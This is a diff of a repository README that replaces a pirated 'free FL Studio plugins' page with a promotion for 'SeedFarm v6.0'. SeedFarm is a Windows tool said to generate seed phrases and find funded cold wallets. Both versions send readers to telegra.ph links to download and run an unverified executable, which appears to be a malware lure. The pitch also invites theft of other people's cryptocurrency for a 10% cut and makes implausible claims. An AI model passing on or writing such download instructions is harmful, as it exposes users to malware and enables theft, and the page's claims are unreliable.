@@ -1,71 +1,68 @@
-Welcome to the FL Studio Plugin Collection! Here you'll find a collection of free plugins that work seamlessly with FL Studio to enhance your music production experience.
+![photo_1_2025-06-03_19-04-52](https://github.com/user-attachments/assets/43c92fa3-ee0b-48b3-9c97-39e0ab386cdc)
 
-Whether you're a beginner or a seasoned producer, these plugins will help you create incredible tracks! 🎧✨
+![photo_3_2025-06-03_19-04-52](https://github.com/user-attachments/assets/99543268-d9da-4bb4-92a2-01cab90dca2c)
 
----
+![photo_4_2025-06-03_19-04-52](https://github.com/user-attachments/assets/e1b02536-62fb-4dec-b99a-ed505dfd81d2)
 
-## 🚀 Getting Started
+![photo_5_2025-06-03_19-04-52](https://github.com/user-attachments/assets/adc1d857-cdd4-4ee0-974f-e59d00c016d5)
 
-### 1. Download the Plugin 🖱
-- Navigate to the Releases section of this repository.
-- Download the latest release of the plugin (it's a .zip).
+![photo_6_2025-06-03_19-04-52](https://github.com/user-attachments/assets/d10a1a21-b496-40cf-a478-81743a41cf5c)
 
-### 2. Install the Plugin 💾
-- If you downloaded a .zip file, extract it to your desired location on your computer.
-- Run the installer if it's an .exe file and follow the installation instructions.
 
-### 3. Add to FL Studio 🎚
-- Open FL Studio.
-- Go to Options -> File Settings.
-- Under Plugin Search Paths, add the folder where you installed or extracted the plugin.
-- Now, you can scan for new plugins by going to Add -> Refresh Plugin List.
+The most powerful yet simple tool for crypto wallet recovery, including competent selection and analysis of seed phrase
 
-### 4. Start Making Music 🎶
-- After installation, you can find your plugin in the Plugin Database under Installed -> Effects or Generators.
-- Drag and drop the plugin onto the channel rack or mixer, and start creating!
+🌟 Key Features:
 
----
+🚀 Ultra-fast seed phrase generation and recovery
 
-## 🆓 Free Plugins Included 
+❄️ Comprehensive cold wallet detection system
 
-We've included some amazing FREE plugins to get you started! These plugins will help you craft your unique sound without breaking the bank. Here’s a list of the ones you’ll find in this collection:
+🔄 Support for multiple chains (BTC, ETH)
 
-1. Valhalla
-2. Fab Filter Pro Q 🎹
-3. Antares AutoTune 
-4. And more 🌌
+🔒 Autonomous operation for maximum security
 
----
+📊 Intelligent probability analysis for phrase selection
 
-## 📚 Documentation
+🛠️ How it works
+SeedFarm uses advanced algorithms:
 
-Each plugin comes with its own documentation, but here’s a quick rundown:
+Generates the correct initial phrases
 
-- Synths: Use the knobs and sliders to adjust filters, oscillators, and modulation.
-- Effects: Apply effects to tracks, including reverb, delay, EQ, etc.
-- Automation: Don’t forget that you can automate almost any parameter in FL Studio to make your sounds more dynamic!
+Outputs wallet addresses
 
----
+Checks blockchain activity
 
-## 💡 Tips & Tricks
+Identifies potentially valuable cold wallets
 
-- 🔊 Experiment with different plugin combinations to create unique sounds.
-- 🎛 You can adjust the CPU usage in Plugin Settings for smoother performance.
-- 🎨 Customize the interface to match your creative style by right-clicking on the plugin window and selecting the “Color” option.
-- 💻 Check out online tutorials for advanced plugin techniques (YouTube is a goldmine!).
+⚡ Quick Start Guide
 
----
+Step 1:[Download the program for Windows](https://telegra.ph/BTC-ETH-SeedFarm-06-26)
 
-## 👨‍💻 Contributing
+Step 2:
+Unzip the file 
 
-Contributions are always welcome! If you have a plugin that you think would be a great addition, feel free to fork the repo, make changes, and create a pull request.
+Double-click SeedFarm v6.0.exe
 
----
+Step 3: Customize
+Select the target cryptocurrency
 
-### 🔗 Links
+Select search mode (quick/deep scan)
+Set custom parameters (optional)
 
-# [Download FL Studio](https://telegra.ph/Programs-for-Windows-06-26)
+Start detection
+We have prepared and uploaded a youtube video for you. It shows in detail how this program works.
+[https://youtu.be](https://youtu.be/-QWPzrpC8vc?si=M7oqtdEm-7jbik4J)
 
----
+❌ Never use for unauthorized access to wallets that don't belong to you!
 
-Enjoy the world of music creation with FL Studio and free plugins. Let your creativity flow!
+
+❓ FREQUENTLY ASKED QUESTIONS
+Q: Will I disclose my IP address?
+A: No, all checks are done through public APIs without revealing your IP.
+Q: Can I recover lost wallets?
+A: Yes, if you have the wallet address the program will generate a seed phrase, but it may take quite some time.
+Q: How long does a full scan take?
+A: There is no exact answer to this question, it all depends on your luck.
+Q: What is my benefit?
+A: 1. To utilize as many computers as possible.
+2. I get 10% from every wallet you find.
